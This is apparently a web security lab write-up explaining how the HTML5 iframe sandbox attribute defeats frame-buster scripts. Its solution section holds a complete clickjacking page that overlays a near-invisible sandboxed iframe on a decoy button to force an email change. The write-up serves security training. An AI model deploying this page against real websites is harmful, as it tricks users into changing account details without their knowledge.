# Clickjacking with a frame buster script


## Description

Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

check and enforce that the current application window is the main or top window,
make all frames visible,
prevent clicking on invisible frames,
intercept and flag potential clickjacking attacks to the user.
Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`

Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.

## Task

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address. The account is solved when the email address is changed.

You have an account on the application that you can use to help design your attack. The credentials are: carlos / montoya.

## Solution

```xml
<html>
<head>
  <style>
    #target_website {
      position: relative;
      width: 260px;
      height: 395px;
      opacity: 0.0000000001;
      z-index: 2;
      top: -368px;
      left: -40px;
    }

    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
   <button>Just click this button!</button>
  </div>
  <iframe id="target_website" src="https://acbf1fe01f117f2e8001131e00530002.web-security-academy.net/email?email=my@evil.mail" sandbox="allow-forms">
  </iframe>
</body>

</html>
```